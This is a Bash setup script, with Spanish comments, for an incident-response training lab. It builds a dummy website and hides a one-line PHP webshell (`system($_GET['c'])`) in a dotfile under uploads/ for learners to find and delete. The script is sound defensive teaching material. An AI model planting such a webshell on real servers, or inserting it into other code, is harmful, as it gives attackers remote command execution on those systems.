#!/usr/bin/env bash
# Planta el escenario del Lab 13: un sitio web con archivos legítimos y una
# webshell oculta en uploads/. La webshell es texto PHP inofensivo (no hay
# intérprete PHP instalado): el ejercicio es encontrarla y borrarla.
set -e
W=/var/www/html
mkdir -p "$W/css" "$W/js" "$W/uploads"

cat > "$W/index.html" <<'EOF'
<!doctype html><title>CMS-13</title><h1>Inicio</h1>
EOF
cat > "$W/about.html" <<'EOF'
<!doctype html><title>Acerca</title><h1>Acerca de nosotros</h1>
EOF
cat > "$W/css/style.css" <<'EOF'
body{font-family:sans-serif}
EOF
cat > "$W/js/app.js" <<'EOF'
console.log("cms ok");
EOF
# un par de .php legítimos (sin patrones peligrosos)
cat > "$W/config.php" <<'EOF'
<?php $db_host = "localhost"; $db_name = "cms"; ?>
EOF
cat > "$W/header.php" <<'EOF'
<?php echo "<header>CMS-13</header>"; ?>
EOF

# imágenes falsas de subidas (archivos legítimos)
echo "fake-jpeg" > "$W/uploads/foto1.jpg"
echo "fake-png"  > "$W/uploads/logo.png"

# la webshell (oculta por el punto inicial)
cat > "$W/uploads/.thumb.php" <<'EOF'
<?php
// webshell de laboratorio (inofensiva: aquí no hay PHP para ejecutarla)
if (isset($_GET['c'])) { system($_GET['c']); }
?>
EOF

echo "Lab 13 plantado. Entra como analista y lee /RETO.md"
